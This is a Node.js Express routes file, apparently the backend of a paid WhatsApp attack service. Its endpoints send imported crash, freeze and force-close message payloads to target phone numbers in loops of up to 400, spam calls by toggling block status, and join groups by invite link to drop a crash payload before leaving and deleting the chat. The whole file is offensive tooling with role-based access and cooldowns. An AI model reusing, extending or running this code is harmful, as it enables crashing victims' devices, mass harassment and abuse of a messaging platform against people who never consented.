const crypto = require('crypto');
const express = require('express');
const { 
  activeConnections,
  biz,
  FriendFcAntiBlock,
  mess,
  GCquizzzz,
  prepareAuthFolders,
  connectSession,
  startUserSessions,
  disconnectAllActiveConnections,
  delayNew,
  invsNewIos,
  delaybuld,
  IphoneUI,
  Ninvite,
  swl,
  XCursedNFBlank,
  Atut,
  crashUi,
  RaysDocuStunt,
  xCursedCrawl,
  xCursedCrott,
  SDXBLANK,
  FreezePackk,
  Xospaminvis,
  nullotaxx,
  XoContact,
  XMmL,
  gsIntX,
  permenCall,
  XiosBugger,
  XiosSejaya,
  clickCrashBlankDelay,
  killeruimsg,
  blankios,
  DelayHardCore,
  fcinvisotax,
  FriendBerulah,
  yurikainvisible,
  fcinvis,
  delay3,
  delaytriger,
  isVipOrOwner,
  getVipSessionPath,
  prepareVipSessionFolders,
  connectVipSession,
  startVipSessions,
  getActiveVipConnections,
  isVipSession,
  getRandomVipConnection,
  checkActiveSessionInFolder
} = require('../services/whatsappService');
const { loadDatabase, saveDatabase } = require('../services/databaseService');
const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
const { logger } = require('../utils/logger');
const { activeKeys } = require('../middleware/authMiddleware');
const { spamCooldown } = require('../utils/globals');
const path = require('path');
const fs = require('fs');

// Import WhatsApp modules
const { 
  makeWASocket, 
  useMultiFileAuthState, 
  DisconnectReason, 
  fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys");
const pino = require('pino');

const router = express.Router();

// ... (kode sebelumnya di whatsappRoutes.js)

// Tambahkan import di bagian atas
const { addActivityLog } = require('../services/activityLogService');

// ... kode lainnya tetap sama ...

// Group Bug endpoint - Hanya untuk VIP dan Owner (Single Response)
router.get("/groupBug", async (req, res) => {
  const { key, linkGroup } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high owner'
  if (!["vip", "owner", "high owner", "admin", "high admin", "dev"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP, Owner, or High Owner role required." });
  }

  // 2. Validasi Parameter (hanya linkGroup yang diperiksa)
  if (!linkGroup) return res.status(400).json({ valid: false, message: "Group link is required" });

  // Ekstrak kode undangan dari link grup
  const match = linkGroup.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.status(400).json({ valid: false, message: "Invalid group link format" });
  const inviteCode = match[1];

  // 3. Cek ketersediaan private session
  const userSessions = getUserActiveSessions(user.username);
   
  if (userSessions.length === 0) {
    return res.json({ 
      valid: false, 
      message: "Private sender unavailable. Please add a sender first." 
    });
  }

  // Pilih session acak dari milik pengguna
  const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
  const sock = randomSession.sock;
  const sessionName = randomSession.sessionName;

  // 4. Jalankan seluruh proses dan tunggu hingga selesai sebelum merespons
  try {
    const result = await new Promise((resolve, reject) => {
      // Gunakan setImmediate agar tidak memblokir event loop, tapi tetap tunggu hasilnya
      setImmediate(async () => {
        try {
          logger.info(`[📤 GROUP BUG] Starting process with session ${sessionName} for group ${inviteCode}`);

          let finalResult = {
            success: false,
            canSendMessage: false,
            groupInfo: null,
            error: null
          };

          // 4.1. Bergabung dengan grup
          let groupJid;
          try {
            groupJid = await sock.groupAcceptInvite(inviteCode);
            logger.info(`[✅ GROUP BUG] Successfully joined group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to join group: ${err.message}`);
            finalResult.error = `Failed to join group: ${err.message}`;
            return resolve(finalResult);
          }

          // Tunggu sebentar untuk memastikan koneksi stabil
          await sleep(3000);

          // 4.2. Ambil metadata grup
          let groupMetadata;
          try {
            groupMetadata = await sock.groupMetadata(groupJid);
            logger.info(`[✅ GROUP BUG] Retrieved group metadata`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to get group metadata: ${err.message}`);
            // Lanjutkan meskipun gagal ambil metadata
          }

          // 4.3. Coba kirim pesan ke grup
          try {
            await sock.sendMessage(groupJid, { text: "Halo" });
            finalResult.canSendMessage = true;
            logger.info(`[✅ GROUP BUG] Successfully sent message to group`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to send message to group: ${err.message}`);
            logger.info(`[ℹ️ GROUP BUG] Group might have chat disabled`);
          }

          // 4.4. Kirim kombinasi bug yang sudah di-hardcode jika pesan berhasil dikirim
          if (finalResult.canSendMessage) {
            try {
              logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
              await nullotaxx(sock, groupJid);
              await sock.sendMessage(groupJid, { text: "Eh" });
              logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
            } catch (err) {
              logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
            }
          }

          // 4.5. Keluar dari grup
          try {
            await sock.groupLeave(groupJid);
            logger.info(`[✅ GROUP BUG] Successfully left group: ${groupJid}`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to leave group: ${err.message}`);
          }

          // 4.6. Hapus chat grup dari WhatsApp
          try {
            await sock.chatModify({
              delete: true,
              lastMessages: [{
                key: {
                  remoteJid: groupJid,
                  fromMe: true,
                  id: "1"
                },
                messageTimestamp: Date.now()
              }]
            }, groupJid);
            logger.info(`[✅ GROUP BUG] Successfully deleted group chat`);
          } catch (err) {
            logger.error(`[❌ GROUP BUG] Failed to delete group chat: ${err.message}`);
          }

          // Siapkan respons akhir
          finalResult.success = true;
          if (groupMetadata) {
            finalResult.groupInfo = {
              id: groupMetadata.id,
              subject: groupMetadata.subject,
              desc: groupMetadata.desc,
              owner: groupMetadata.owner,
              creation: groupMetadata.creation,
              participants: groupMetadata.participants.length
            };
          }
           
          resolve(finalResult);

        } catch (error) {
          logger.error(`[❌ GROUP BUG ERROR] ${error.message}`);
          reject(error);
        }
      });
    });

    // 5. Kirim respons akhir HANYA SATU KALI setelah semua proses selesai
    res.json(result);
    
    // 6. Tambahkan activity log
    if (result.success) {
      addActivityLog(user.username, 'Group Bug Attack', {
        groupInviteCode: inviteCode,
        groupInfo: result.groupInfo,
        sessionUsed: sessionName,
        canSendMessage: result.canSendMessage
      });
    } else {
      addActivityLog(user.username, 'Failed Group Bug Attack', {
        groupInviteCode: inviteCode,
        error: result.error,
        sessionUsed: sessionName
      });
    }

  } catch (error) {
    logger.error(`[❌ GROUP BUG FATAL ERROR] ${error.message}`);
    res.status(500).json({ valid: false, message: "An internal server error occurred." });
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Group Bug Attack', {
      groupInviteCode: inviteCode,
      error: error.message,
      sessionUsed: sessionName
    });
  }
});

// Send bug to target
router.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  logger.info(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    logger.info("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  // Role-based Cooldown
  const role = user.role || "member";
  const cooldownSeconds = ROLE_COOLDOWNS[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    logger.info(`${user.username} Still Cooldown`);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Bug Attack - Cooldown', {
      target,
      bugType: bug,
      remainingCooldown: cooldownSeconds - diffSeconds
    });
    
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // Respon duluan
  user.lastSend = now;
  saveDatabase(db);
  logger.info(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // Kirim bug di background
  setImmediate(async () => {
    try {
      // Gunakan fungsi yang sudah diimpor untuk mendapatkan session
      const sock = await checkActiveSessionInFolder(user.username, userIsVipOrOwner);
       
      if (!sock) {
        logger.warn(`[❌ BUG] Tidak ada session aktif untuk user ${user.username}`);
        
        // Tambahkan activity log untuk tidak ada session
        addActivityLog(user.username, 'Failed Bug Attack - No Session', {
          target,
          bugType: bug
        });
        
        return;
      }
       
      const targetJid = target + "@s.whatsapp.net";
      logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${targetJid}`);

      // Kirim bug berdasarkan tipe
      switch (bug) {
        case "crash":
          for (let i = 0; i < 15; i++) {
            await swl(sock, targetJid);
            await IphoneUI(sock, targetJid);
            await Ninvite(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "ios":
          for (let i = 0; i < 10; i++) {
            await IphoneUI(sock, targetJid);
            await sleep(3000)
          }
          break;
        case "bokep":
          for (let i = 0; i < 20; i++) {
            await swl(sock, targetJid);
            await IphoneUI(sock, targetJid);
            await Ninvite(sock, targetJid);
            await sleep(1000)
          }
          break;
        case "fcinvis":
          for (let i = 0; i < 400; i++) {
            await fcinvisotax(sock, targetJid);
            await FriendBerulah(sock, targetJid);
            await sleep(700);
          }
          break;
        case "fcnoinvis":
          for (let i = 0; i < 400; i++) {
            await fcinvisotax(sock, targetJid);
            await sleep(2000);
          }
          break;
        case "uix":
          for (let i = 0; i < 20; i++) {
            await XCursedNFBlank(sock, targetJid);
            await crashUi(sock, targetJid);
            await sleep(1000);
          }
          break;
        case "delay":
          for (let i = 0; i < 320; i++) {
            await RaysDocuStunt(sock, targetJid);
            await xCursedCrott(sock, targetJid);
            await xCursedCrawl(sock, targetJid);
            await sleep(800);
          }
          break;
        case "spam":
          for (let i = 0; i < 100; i++) {
            await delaybuld(sock, targetJid);
            await sleep(1000);
          }
          break;
      }

      logger.info(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
      
      // Tambahkan activity log untuk berhasil
      addActivityLog(user.username, 'Bug Attack', {
        target,
        bugType: bug,
        success: true
      });
      
    } catch (err) {
      logger.error(`[❌ BUG ERROR] ${err.message}`);
      
      // Tambahkan activity log untuk error
      addActivityLog(user.username, 'Failed Bug Attack', {
        target,
        bugType: bug,
        error: err.message
      });
    }
  });
});

// Spam call to target
router.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  // [MODIFIKASI] Menambahkan 'high owner'
  if (!user || !["reseller", "reseller1", "owner", "high owner", "vip", "admin", "high admin", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);

  const role = user.role || "member";
  const maxQty = MAX_QUANTITIES[role] || 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  // Dapatkan session aktif
  let bizSessions = [];
   
  // Jika user VIP/Owner, coba gunakan session VIP terlebih dahulu
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      if (biz[sessionName]) {
        bizSessions.push({
          sessionName: sessionName,
          sock: sock,
          type: "Business",
          isVip: true
        });
      }
    }
  }
   
  // Jika tidak ada session VIP atau user bukan VIP/Owner, gunakan session milik pengguna
  if (bizSessions.length === 0) {
    const userSessions = getUserActiveSessions(user.username);
    bizSessions = userSessions.filter(s => s.type === "Business");
  }
   
  if (bizSessions.length === 0) {
    return res.json({ valid: false, message: "No business session available" });
  }

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    
    // Tambahkan activity log untuk cooldown
    addActivityLog(user.username, 'Spam Call - Cooldown', {
      target,
      quantity: callQty,
      remainingCooldown: remaining
    });
    
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    // Pilih session acak
    const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
    const sock = randomSession.sock;
    const sessionName = randomSession.sessionName;
    
    // Unblock target terlebih dahulu
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    logger.info(`[✅ FIRST SPAM CALL] to ${jid} from ${sessionName}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });
    
    // Tambahkan activity log untuk spam call
    addActivityLog(user.username, 'Spam Call', {
      target,
      quantity: callQty,
      sessionUsed: sessionName,
      success: true
    });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          // Pilih session acak
          const randomSession = bizSessions[Math.floor(Math.random() * bizSessions.length)];
          const sock = randomSession.sock;
           
          // Unblock target terlebih dahulu
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");

          logger.info(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${randomSession.sessionName}`);
        } catch (err) {
          logger.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    logger.warn("[❌ FIRST CALL ERROR]", err.message);
    
    // Tambahkan activity log untuk error
    addActivityLog(user.username, 'Failed Spam Call', {
      target,
      quantity: callQty,
      error: err.message
    });
    
    return res.json({ valid: false, message: "Call failed" });
  }
});

// Custom Bug endpoint - Hanya untuk VIP dan Owner
router.get("/customBug", async (req, res) => {
  const { key, target, bug, qty, delay, senderType } = req.query;

  // 1. Autentikasi dan Otorisasi
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // [MODIFIKASI] Menambahkan 'high owner'
  if (!["vip", "owner", "high owner"].includes(user.role)) {
    return res.status(403).json({ valid: false, message: "Access denied. VIP, Owner, or High Owner role required." });
  }

  // 2. Validasi Parameter
  const cleanTarget = (target || "").replace(/\D/g, "");
  if (!cleanTarget) return res.status(400).json({ valid: false, message: "Target is required" });
  if (!bug) return res.status(400).json({ valid: false, message: "Bug list is required" });
  if (!["global", "private"].includes(senderType)) return res.status(400).json({ valid: false, message: "Invalid senderType. Must be 'global' or 'private'." });

  const bugsToSend = bug.split(',').map(b => b.trim());
  const parsedQty = parseInt(qty) || 1;
  const parsedDelay = parseInt(delay) || 100; // Default delay 100ms jika tidak ditentukan

  // 3. Logika berdasarkan SenderType
  let sock, sessionName, maxQty, effectiveDelay;

  if (senderType === "global") {
    maxQty = 10;
    effectiveDelay = 500; // Abaikan delay user, gunakan 500ms
    sock = getRandomVipConnection();
     
    // Cek ketersediaan session global
    if (!sock) {
      return res.json({ valid: false, message: "Selected sender type (global) not available right now." });
    }
    sessionName = "VIP Session";
  } else { // private
    maxQty = 200;
    effectiveDelay = Math.max(parsedDelay, 10); // Delay minimal 10ms
    const userSessions = getUserActiveSessions(user.username);
     
    // Cek ketersediaan session private
    if (userSessions.length === 0) {
      return res.json({ valid: false, message: "Selected sender type (private) not available right now." });
    }
    const randomSession = userSessions[Math.floor(Math.random() * userSessions.length)];
    sock = randomSession.sock;
    sessionName = randomSession.sessionName;
  }

  // 4. Validasi Qty akhir
  if (parsedQty > maxQty) {
    return res.json({
      valid: false,
      message: `Quantity too high. Max allowed for sender type '${senderType}' is ${maxQty}.`
    });
  }

  // 5. Respon sukses segera
  res.json({
    valid: true,
    message: `Attack queued on ${cleanTarget} using ${senderType} sender.`,
    details: {
      target: cleanTarget,
      senderType: senderType,
      bugs: bugsToSend,
      qty: parsedQty,
      delay: effectiveDelay
    }
  });

  // 6. Eksekusi di background
  setImmediate(async () => {
    try {
      const targetJid = `${cleanTarget}@s.whatsapp.net`;
      logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);

      // Pemetaan nama bug ke fungsi
      const bugFunctions = {
        'XMml': XMmL,
        'FreezePackk': FreezePackk,
        'gsIntX': gsIntX,
        'RaysDocuStunt': RaysDocuStunt,
        'FriendBerulah': FriendBerulah,
        'fcinvisotax': fcinvisotax,
        'xCursedCrott': xCursedCrott,
        'xCursedCrawl': xCursedCrawl,
        'permenCall': permenCall,
        'XiosSejaya': XiosSejaya,
        'killeruimsg': killeruimsg,
        'XCursedNFBlank': XCursedNFBlank
      };

      for (let i = 0; i < parsedQty; i++) {
        for (const bugName of bugsToSend) {
          const bugFunction = bugFunctions[bugName];
          if (bugFunction) {
            await bugFunction(sock, targetJid);
            await sleep(effectiveDelay);
          } else {
            logger.warn(`[⚠️ CUSTOM BUG] Unknown bug function: ${bugName}`);
          }
        }
      }
      logger.info(`[✅ CUSTOM BUG] Attack on ${targetJid} completed.`);
      
      // Tambahkan activity log untuk custom bug
      addActivityLog(user.username, 'Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        delay: effectiveDelay,
        sessionUsed: sessionName,
        success: true
      });
      
    } catch (err) {
      logger.error(`[❌ CUSTOM BUG ERROR] ${err.message}`);
      
      // Tambahkan activity log untuk error
      addActivityLog(user.username, 'Failed Custom Bug Attack', {
        target: cleanTarget,
        senderType,
        bugs: bugsToSend,
        quantity: parsedQty,
        error: err.message,
        sessionUsed: sessionName
      });
    }
  });
});

// ... kode lainnya tetap sama ...
// Get active WhatsApp connections
router.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // Cek apakah user adalah VIP atau Owner
  const userIsVipOrOwner = isVipOrOwner(user);
   
  let privateConns = []; // Session milik pengguna sendiri
  let globalConns = [];  // Session global (VIP)
   
  // Jika user VIP/Owner, sertakan session VIP sebagai session global
  if (userIsVipOrOwner) {
    const vipConnections = getActiveVipConnections();
    for (const [sessionName, sock] of Object.entries(vipConnections)) {
      const type = biz[sessionName] ? "Business" : (mess[sessionName] ? "Messenger" : "Unknown");
      globalConns.push({
        sessionName: sessionName,
        type: type,
        isActive: true,
        isVip: true,
        owner: "global" // Menandakan ini adalah session global
      });
    }
  }
   
  // Dapatkan session milik user
  const userConns = getUserActiveSessions(user.username);
   
  // PERBAIKAN: Hapus properti 'sock' untuk menghindari circular reference
  const safeUserConns = userConns.map(conn => {
    // Menggunakan destructuring untuk membuat objek baru tanpa properti 'sock'
    const { sock, ...safeConn } = conn; 
    return {
      ...safeConn,
      owner: user.username // Menandakan ini adalah session milik user
    };
  });

  privateConns = [...safeUserConns];
    
  logger.info(user.username);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,  // Session milik pengguna sendiri
      global: globalConns     // Session global (VIP)
    }
  });
});

// ... (kode setelahnya di whatsappRoutes.js)
// Get pairing code for new WhatsApp session
router.get("/getPairing", async (req, res) => {
  const { key, number, isGlobal } = req.query; // Tambahkan isGlobal parameter
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    logger.info("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  // [MODIFIKASI] Check if Global pairing requested
  const isGlobalSession = isGlobal === 'true';

  // Optional: Add permission check for global creation if needed
  // if (isGlobalSession && !['owner', 'vip', 'high owner'].includes(user.role)) ...

  try {
    // [MODIFIKASI] Tentukan path berdasarkan isGlobal
    let sessionDir;
    if (isGlobalSession) {
        sessionDir = path.join('vip', number);
        if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
    } else {
        sessionDir = path.join('permenmd', user.username, number);
        if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
    }

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          logger.info(`🔄 Reconnecting ${number}...`);
          await waiting(3000);
          // [MODIFIKASI] Pass isGlobal flag ke pairingWa
          await pairingWa(number, user.username, 1, isGlobalSession);
        } else {
          delete activeConnections[number];
        }
      } else if (connection === "open") {
         // [MODIFIKASI] Handle pemindahan file creds saat sukses connect
         activeConnections[number] = sock;
         const sourceCreds = path.join(sessionDir, 'creds.json');
         let destCreds;
         
         if (isGlobalSession) {
             destCreds = path.join('vip', `${number}.json`);
         } else {
             destCreds = path.join('permenmd', user.username, `${number}.json`);
         }
         
         try {
             await waiting(2000);
             if (fs.existsSync(sourceCreds)) {
                 const data = fs.readFileSync(sourceCreds);
                 fs.writeFileSync(destCreds, data);
                 logger.info(`✅ Session saved to ${destCreds}`);
             }
         } catch (e) {
             logger.error(`❌ Failed save session: ${e.message}`);
         }
      }
    });
    
    // If not registered, generate pairing code
    if (!sock.authState.creds.registered) {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      logger.info(code);
      if (code) {
        return res.json({ valid: true, number, pairingCode: code });
      } else {
        return res.json({ valid: false, message: "Already registered or failed to get code" });
      }
    }
  } catch (err) {
    logger.error("Error in getPairing:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Helper function to wait
function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper function for pairing WhatsApp
// [MODIFIKASI] Added isGlobal parameter default false
async function pairingWa(number, owner, attempt = 1, isGlobal = false) {
  if (attempt >= 5) {
    return false;
  }
  
  // [MODIFIKASI] Determine path based on isGlobal
  let sessionDir;
  if (isGlobal) {
      sessionDir = path.join('vip', number);
      if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
  } else {
      sessionDir = path.join('permenmd', owner, number); 
      if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd', { recursive: true });
  }

  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        logger.info(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        // [MODIFIKASI] Pass isGlobal recursively
        await pairingWa(number, owner, attempt + 1, isGlobal);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      
      // [MODIFIKASI] Destination path logic
      let destCreds;
      if (isGlobal) {
          destCreds = path.join('vip', `${number}.json`);
      } else {
          destCreds = path.join('permenmd', owner, `${number}.json`);
      }

      try {
        await waiting(3000);
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          logger.info(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        logger.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// Helper function to detect WhatsApp type from credentials
function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

// Helper function to get active connections in a folder
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${subfolderName}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        isActive: true,
        type: detectWATypeFromCreds(path.join(folderPath, file)) // Add WA type
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName}`);
    }
  }

  return activeCreds;
}

// FUNGSI INI DIHAPUS KARENA SUDAH DIIMPOR DARI SERVICE
// async function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) { ... }

// Helper function to get user's active sessions
function getUserActiveSessions(username) {
  const folderPath = path.join('permenmd', username);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const userSessions = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${username}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      const credsPath = path.join(folderPath, file);
      const type = detectWATypeFromCreds(credsPath);
      
      userSessions.push({
        sessionName: sessionName,
        sock: activeConnections[sessionName],
        type: type,
        isActive: true
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName} (${type})`);
    }
  }

  return userSessions;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = router;